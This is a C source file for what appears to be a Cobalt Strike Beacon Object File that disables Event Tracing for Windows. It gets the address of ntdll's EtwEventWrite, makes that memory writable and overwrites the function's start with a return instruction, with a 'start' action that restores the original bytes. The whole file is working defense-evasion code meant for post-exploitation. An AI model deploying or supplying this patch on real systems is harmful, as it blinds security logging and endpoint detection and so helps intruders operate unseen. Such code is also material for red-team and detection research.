#include "bofdefs.h"
#include "base.c"
#include <stdio.h>


void etw(char * action){
	char * moduleName = "ntdll.dll";
	char * functionName = "EtwEventWrite";
	unsigned char buf[8];
	SIZE_T bRead = 0;
	BOOL result = FALSE;

	HMODULE module = NULL;
	FARPROC funcAddress = NULL;

	module = KERNEL32$LoadLibraryA((LPCSTR)moduleName);

	if (module != NULL)
	{
		funcAddress = KERNEL32$GetProcAddress(module, (LPCSTR)functionName);
		if (funcAddress != NULL)
		{
			char * startbytes;
			char * stopbytes;
			char * patchbytes;
			int numByteToPatch;

			#ifndef _X86_
			numByteToPatch = 1;
			startbytes = "\x4c";
			stopbytes = "\xc3";
			BeaconPrintf(CALLBACK_OUTPUT, "Action: %s\nWorking with 64-bit.", action);
			#else
			numByteToPatch = 4;
			startbytes = "\x8b\xff\x55\x00";
			stopbytes = "\xc2\x14\x00\x00";
			BeaconPrintf(CALLBACK_OUTPUT, "Action: %s\nWorking with 32-bit.", action);
			#endif

			if(MSVCRT$strcmp(action, "start") == 0){
				patchbytes = startbytes;
			}else if(MSVCRT$strcmp(action, "stop") == 0){
				patchbytes = stopbytes;
			}

			DWORD oldProt;
			KERNEL32$VirtualProtect(funcAddress, 4, PAGE_EXECUTE_READWRITE, &oldProt);

			MSVCRT$memcpy(funcAddress, patchbytes, numByteToPatch);

			DWORD oldOldProt;
			KERNEL32$VirtualProtect(funcAddress, 4, oldProt, &oldOldProt);

			result = KERNEL32$ReadProcessMemory(KERNEL32$GetCurrentProcess(), funcAddress, buf, sizeof(buf), &bRead);
			if (result)
			{
				int i = 0;
				for (i = 0; i  < numByteToPatch; i++)
				{
					BeaconPrintf(CALLBACK_OUTPUT, "%x", buf[i]);
				}

			} else {
				BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed\n");
			}
		} else {
		BeaconPrintf(CALLBACK_ERROR, "Failed to find function address\n");
	}

	} else {
		BeaconPrintf(CALLBACK_ERROR, "Could not load library\n");
	}
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	char * action;
	BeaconDataParse(&parser, Buffer, Length);
	action = BeaconDataExtract(&parser, NULL);

	if(!bofstart())
	{
		return;
	}
	//CALLYOURFUNCHERE
	etw(action);
	printoutput(TRUE);
};

#else

int main(int argc, char ** argv)
{
	//code for standalone exe for scanbuild / leak checks
	char * action = argv[1];
	etw(action);
	return 0;
}

#endif
